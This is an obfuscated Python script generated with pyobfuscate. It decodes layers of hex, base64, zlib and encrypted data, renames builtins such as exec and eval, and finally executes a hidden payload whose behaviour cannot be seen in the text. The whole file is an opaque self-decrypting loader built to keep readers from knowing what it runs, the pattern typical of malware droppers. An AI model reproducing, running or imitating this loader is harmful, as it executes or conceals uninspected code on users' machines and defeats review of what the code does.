#pip install pycryptodome  , It works only v3.11.5 Above.
import random ,base64,codecs,zlib,sys;py=""
sys.setrecursionlimit(1000000000) 

pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'BufferError * list','exec':'hY1YGuw3QVbdLWnl1TQ5CJVS8pdnlOc35BlehQJZbYq6GNhfRt6QX1oXrTWsVwmIOuyN8n6bcjW7ssOg','eval': bytes.fromhex('''109c0f121848ed070ef861097a1d506c46bec0d48fb4da57d66e5d4e9ecaec695c3a831b67354d03e43de534f336759a6dc4ec3fba5326761609c05ee7bf296cdc95d658fd5d20ea409b26316b52a9fc442a8a8cbb1851cafaaf19e4051a35502a5b4292ea97bf3407037086d078e5ed28c19823083f66e0fb4ba4ddd93c3b04b4879050c64aefe99cad10cb00d622072a6dff5255fbe4c146cd14506c23f36eaccbf55391ea84088cdd0bd0eb6e1ac16d25050a92eaf918676d5bc8b858616e1ae1ad4b5b08181a552f5071a5d02bf603b75cc0e1309cd36d32aca8025e96d603230cf1c21ff262d3555d06af0b367f3b10f7489b0ad1f87f76198111e759d301478857686344965aefdf1e9f82c0eaa193547aac7283b63e29db5f0aadb2cf43c4125913f4c15b6064bab2a9fe40efd7eff79aef76251218ea2dce1f85aee3aadc474221072fa91190bcb384d8287c1a4fe3d96cf6aa068d1288f91f1d1a684f7d063b9f157598b0da31f1f927587a3ff004f3d8e5b320e6ad3ca5757ea8f64b885f0e015fcd42a287dad371ad6c2624651c060dd7a63fe9eadae35dc13e1a2588ebe523a566f2735cc768864f59ea336c71bd79e936732fc0f4731e41f31f51926fe5378057f4056b777c989de7fa305fb41caab0fa14bbc9811fff3a64c2d24fea8bb1a45ac26f573a1e6d92f0f877676ea50ec15d243d53623628f0c27b9e943bf738dcc3b18d4675530617dec560d683909a635ff2df1af56cba36ca4c2b2a4ac68cbeefd84074dbe7bd86f20d8aa04152fcc74db0386b0f53bb939f757f2314f1dcba89b6ebd6cb0e6e761fc4da973e28b0d4f7920a695ae1ae7172584c2ab57e7024a77462680b6a0266c4bf8e4d56b1591b27210995b668f4f6e957fe06225ef85e51bf14ad465b37e7c0b4e37ba731148fb6a6438bf758d5017d64db17272c2a14941b81e4a15ae8796a16e00030025d0f604a2e8bfef5494508fd8cbfc85b3738a6bcd17440d112bef3d17196dc7b7fe73523dc8489757e91802a55365d64205ceeb54897939033ed77e087469df54890229507a870c86e4f28c0869d33c5f6ef599d5acadbd07e5285e18b835689f7a3466d7768eb4e622f0edab188d538f1295716a529d77707c42699087f2bceb24cfbf692b2ea2c41618ca300732e97b4cbeb5b3482bc6f67c3a796cafcc77c754e700ac09d8a75a9b984ea89ae4c7fdf0a81d2394bd500bec918c7c486f2b47654463fb0bcd69f1ad98a0db9c6f234371f35093d92d1d0b3a381a3bcb08241ad54251999af59f35177b6f82c624828c381969a54c15192d8f9fc7705775a5b71ef9d433909e475acc521f9f66e8737c0bc03bd317d9116686cb5a85bea779da3bcceea79e99fd09da4a2f77a6417b9dc2726fa27853250ddcb3e0b3c75a25419e28391de5498ef8f7050e56f05832c11baa0fb81cd771192dc227ec8adf226a6045003a423c4d81f4693fed4fc03c3c41a8ce970a568d1dfc0d2f8f6bcd4e9d62c1417e2c084c5910d2fc2121bd995a047bb33d5e6a6f67aa735e929fee97aa61b49d936e2d89294b7077be7e97b9b34f3851f26748a5485e51ab0f30c0d6b467312e1360835ffe481cbeaa61124a9732ad92b2fc817d5e8f9b1cb8e0c6ccbe1c960035552e918669723ed599cafd5c7656aa579beeb40eda1fa74c0fc29812e9b9b87c500c8d07d0a3ed50ac86a92e650e1d9c9dbcaf75a627f74c97ccdadd35f76dbc586f90f0ebd10688bd8031e2a5c042868b57aa885fb520669fd802ee38c03ad77b299cf8e0089cf91cae576bd624e612c144e5f56e7d30e240ace581a6cd0a7b0704835368125ea71f74404dcc4483939a1d1f54e9677a1ec9cde271bdb66f7f784572e14192fd0f360ad428cc077602bda26f234cc2a30c92f07a01699059d0fe2e82ca3d770b913e84d622b1ad3dddfed88f7ff94ba2dda72bc3a7ca1002a7daea8011dbb6d6e73bf0ea58fd46f413531f287bef0a3f4e0274db3a51f05a5f913cd1af957f550da67a449cdc5b3ad824cdb8607f84f0dea40aefb078de254e9e1e31e93e15a0fe246b812796539de903e885cab9f22d9e62292fb1e4cf4affe4a977779bdc2b48a6a32e5331c933ed64b5eb42bc50f215ac841d086a70aea90d035e08fd52bbbb259c10f3ede35eb244d49942f017af76f74a7471d6f9025be8a8e9b9f597a349644a91c41a2efd75c892b6d1d79bb946b81ff1a810f9dd57cd8664074ec8168e71d7cbac1423fb853642326241f5274c70b9f12f1fb2b83cdc4364b1883a3be4ba778ef20e5d6ce633a73b3f6d5b7fa0a606bd80caf64524dfa930337ff56f8e3409a8966ac8e3d30d67d47320c2e2ea1d5a85977222e4a906069c98178f28941df2a5381c845b1afdc8aec922803188dcfc292b5010dbb7b6fd4797c637cd723c619a5b7192e5b23462a312b07a967c7403c6e3af9d2dea6ae57ce24ef309d78472d3210c44082e8d44347d1afd773efa0d455ca4797d8bf253b4bbe4e8b689e76a9342f68727a94cee6adcdeb7652d054af187001e45749aa87a3c45bf6fbe73dc848522a8729d580e1164951b63762f9b0a94fc42ef61f9e3679cdd6c9927dbe35b9e14df7b1416ba7c6d29261578c3d5f4005c78503c84f408ccd151a386b49f89c7914fe7288cbccb7fc222e7399f9b4fffbd28fb8b1c5dc1b0912ec90a37b24e2147327e51d081846cee49a1f382ffaa23161ed6ff73865715e49ab7407a1f4f95ed64f3b4708211928dc4cd3a434d36f6cb29ada3e819799098ea3911fe929de47e3df1878c094e38de2119be9ca01a3921451a4dc01fa7441b5f649256d110aa4880b25ab50e0791dfe06dc6b11ac4d94abf7df06d6d32da9a09826874c0ecdf469f11de35284ea83fb1623844007473eb1f28c54c7781c5ee9abd50bf1480ee04b7acd04666b995714f26ba5f862646455d83e7a2b5bdeb57e4500ced485e162a2e4a151bead07c49290a12af6d163622dc7f3aa6e4b761f7a0051c4934591fe4f7f078bdf189d1b6e06b0da1cf95d2994d43e7ec623b60f99fe318bbd789bc2f26e4fd6259f526de0749f6998a063b6c87efa634ef57841c0e4d4af477c8a8797e29ce0c5cccd35fefe3b90c04ed041c14095ddf92b76ff6a923b91be2d19b90311a797cbf58b476a68fd59a0f266b300212f2ab17078aada7a3972beaa4d5ac1361450081d351ce4553c9c11d1f50c98dfb6ebc2949b0a900367e88e169a6ed1455def0dc717678b58cfb13f1f939576e3d4cac4ed003fc9e47485370638b7caf51d304eddbf617bb376db2ac0efb5cb11e4c2786e965fd32ed5a6f880b73f11775f90eecf68186e58662f15887ae7c5988b56280e0241db63eadecdabcc9655b382dd3aa4d9c792d5504355b43fe8ffcead93fdb1f50b346a90487cbbab41e84174dda5011ae2ce5785e861de4221246e7620cc97461048f9463c3b4ef0230f374b2b6ae9c49caa0f233abb75f7dba061e538fd68ffc40c91d38052cb03
768cc3669f707fac5a61b5e4ebbfa8697f14e88d255c1e8c3a78288844a3b116115cd0de06f00698461562f63abc44f8c03a9266226fd8a462a139757dc6b90171c1d00bb72a2ea315eb69ab6d67385db34302b920f63a035c045efba05feaf8b24d878a7508b362525ad9744d3ae051ae5a0ec3cf243c7bef91971b3489f50c271e14de3e04e905597664c93d20fa4ebcc8bcfaa14a88db455bcad934e28b5bf074da75948a90276a8058f0ad3f10940f895d2b682a5ac498f7132d9357e3ab9bf8b5da44d5aacfc298bf68cc8a00656de482f72f4cbfb45077ab8d40e39ef2359013f763e8105fdf32cff5cc9a3c8872c63f6e4319125682edd0699a1e17ef417f9d5fea084ba2494595489413acf8ead171e937cb4a0fc433142fb55ada56da6ac43fa4cc8eb076d128725ba12a7d05ff89bf964d1e99d01d4b7703f1e847b9100f6beaf8ebd80b2f03a20433752510c45701934dd67c66c125e8d28488177482d5d37c8bec39442d9766fbf757d6038d6e11c34cb2d360001b5d97ae56aab4acab45903a9011a60d9348cbb4bf948acb63e9c798d66034127bd5c194a708a63eb6ce8d44317aa1500280f4ca59012919967b10518a7dfa211796ac9dcc281ff172ab19581cba46c3d2688b9adfd888f654de95cdea6ff0e5158e9e4982b7e6d52b2c125173c97a27009079c2d13ba25181ec8181ab79dffe2b92e798d43a0f9636e7823c8167c92b7cca60825946b0f0b9aadaf09753cf9c4943bbe4d159aaeb8a083e9c314ee63e0d9b34dd3a065320c29910e97eba0155e0e352ce07874e99c6f27e6307faaa8e4345491630825b22f232377aed365d4553b6db05a97adc38acb2f204cd16fb69c59b96892e9059e0a18673aab5f809b65c514d18a880325da82d12d01f8993afe0371e133363294b68b38a75ac2ffd107487bd1a137dee932562d16cd2b028ea79a1759a9031eff3720229a272078812d5b9ea7ccd1c29025e8168ea752ca35607e07116f138e4512b8b5b2ddbf245defcddda7d5ad355bf2c7efd59776cccc967573572f3e29b748f93a2208a13b56304511ff82053648d28c9ef9ed347c0866a47d3f433f1b35cf706ea83547d6bdb358988c5c74a606fbd0ca2ad66b8b63ac751eb66c8fcccdf5220bf6870ab215aeac664f4752d1d2eaa90f0e350297f261a3c4ac83540ee8f760d98ef488762ee28ca20019534584e403f9be2d06387764391cb80683b1993aa4fed16afd35a470412379a712d55f56bb6ba422d9618511060370ecab77278ac16b59b1eb7ee14960951314246187dd2fa8fbe7d6e3906cda6e7d183bbc2166e41bbc64c5882c9639aefac494e15ba3d8a3f2d65cf6692bce195fbb8e9682abc67bd091ae654e1d23f415bf61310b761c2937b9369daf271d24347978ebe128752b51448604d995b6d709cf00fc18933b47cc692a441b6044b0b1357a2cb5e6262568349d9ad4ff6fd5d4795ecc208905c6960c5c04974d2cbda5e5961daf9bbf6cac6bcbe3f24a8169f8842854693e8564463168fb1205ed916c0f9a5fb9428c1b2fc3d6c5a682cf51dc515aada011640528794ef00869df4928b744a9ef08d0945154956c0175320f7428f7db356d7705e2bb3440a5ba8ac333345c1ecac486f3dd965d849d712597a2459ec56bb1d967f84ec0fa09463934f1c42208477b5dea8a8767be059d8d56a0d61478fe49bb9e5774b5da977da98448ee04634799a15a6449506cf158d8a1d378408ecfe863c2d3c2576757579dab7e98ff85926f84f2fa94db6b7139004398874e526974944ec79c413324821894f1948c272fa4f0ec3089baa4990d39e92a7554211d2cab94a831ba6d990c79d511bad1c6021ea95490a21a9803d8658c8a4b9414166483d4a83f321854c74545603084b652a5b14b3cc01dd3fb1391cfe62df9bab2b56a4da0666ba4d47b00945e47a48bf6e959342d69490abcd421c4d06e16c9b127e10352711c7082e25560e0f8369653479780ea5e7c120d91d642880cb72a95216bd7c42930b84e0770522c8fca205b623cb1511364e9a26a390dd7f096531157c5e80f0382b1f1d6327ba2212dda1d49ede453a0880cff10945b9b517299acc0f69d74d0565a2b69e21bfef360493f30c4b7311e32d062c47a8dea0352897ff0535be48b07cdc0711eb28314a054adddf6660371d18d0159019d691bacc90d85296cc782392001e1bc5b147424bcc5c17a7d87f2e0d416f63d4f3aaa282c6edac687ea340a50554aa22479fce5e2ef18d6771bc891a6ae4cdd2fd99ad99cfc53ce17f5fd65bfaf91a40370ab33b21cf73d9ca5349f33caa475279d445254aed5d6b3cc11e5abc6f31a2bbffd5475848c5210db4599301124ccb8e69040dd0237627420a0e7144409f9be604f935116b683ca354dac2b1863c0699734bc27f135d13c1ac6255e32fe52510775089706c6b0504e7fd24af1f21576a754cd151b44ac481431bc07b31e1da19d7b2e8985aaf0a879e960f649ae92919c4cc4e97a569692b737226da9009d83dd53494c86de7c7b5cbef1266f455867d52100529068ba44ee1216675e532f152b3ad70a80bb2a9a579d1d1178eed28f808acf8b67e9f8e02e3ff204d6bfba85b0d5948502e77e360938577b1d09f7181805ac442c8a241754aba8eb2eef5e5a42cb494aae2e4f5d3cd8142eda7db0d6df3f67d58c0d42dcda3b47ad50c6fa85382715accac6f766c9a8342e27b2cc5044be0a2153c70a8728673319c40bd1577334b27b0e9ce90c96cbf77950e7e53907107909996fc5ffa699f7becd6cfeef8abd17af2bb6988a438f99bc4e256baf3a366d2b7efa1d4c919555c683c900abb1bb52bbeef31b59c12e81d9377c6c3ae0623fcdf785eec0106fa2dd937d00f1ee52c2aac9dcfc86a65dcbe87830f29f9231273a6f05d830a7cd4cad6ad50724854cc5040a3131d6f6650b6bc226a806bf7ab5c20cc8bd41dfcdd886c987ed0f1a826a7ef03c343748982b8717e8897d9554f3fb054b1e841849bb35127d775fe4ac835d10e2f7b687c6a0681c6fe902286a0605ed9f441d5d4bb96671623e36d11ce9bb3d286535542d9598554e068aafcf598042f8358f5dedabf55a67edf119ca00e229e24a10758f92a855d7f6e16340abff32418998987275469c9e33c353a7d46c5c98ab439f9f7f7b13face99a8b2c55d07bdd5580499d352e42791d3bd250c5f2b27b550f7b6c8b94ce3fcf182bade37ac69c21f221bd194937a16bd7e17d82bee17c93528e737ce8cdf61f6bbe9c7fff6cefcdcb227c18bf57d9de5cc9070b41c9312f7a57bac3822490fc2329d8bda190a43d9695947890c450a984f5ab7bccf957b78717248db0d26aad9e697cbf58da082838248292001186445117c1cf39d3a3e83dce34bfb992ff458f4cf5c5026bccb53b91e176688ce248cfca71df37494349e7e7365aa4d997ffcb3741ccb879e92738ac4714bee830eb5158981c12453053c38b12c3cff7e98e8473a17d9be275e8
614caac0371b9d3f7044d8f1552c1b7feb7fabc52501b07b89db658bf28437be550ed3cb07b7f6262a5df145372699f741d0593d71ffabba7a264f79533948668301b2caf00035b2b98f77ffe89fb284c440723e8967bcec78ea1a17f1b8bdd3d526080265ecdcf25d26671728436f722c00e80da8de118ba3bd73e25e985439bc5507ba446f2a24fc231dba9b1872316ab05286e89cbec79d742bfc3d9c1a71dcc937e02127324ddd856649c0a3f8677552ca8f4ea8814997c27354b101a262b9b3d8668352ed5a1c85360cd70c5e81e9e889d9c1913400043a7fd9f80cc3817607091d0e8844d94371e84dfbf0751c44cfd92a96848020871854ceb20d7170e79d1880423defee0a5a84d2d4d3124b4cfa00e761af3ad109d6db7a330bc9e7b9b8790969201a86d799ee0d2eeb71124ef22f15ddd7cdd0a19f4e914efb59e882c923633f327839889528f9d1ff8013917d16075a4f87a2e9286d7d1f0e7f1713cfd7c50338a1ca'''.replace("\n","")) })

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')


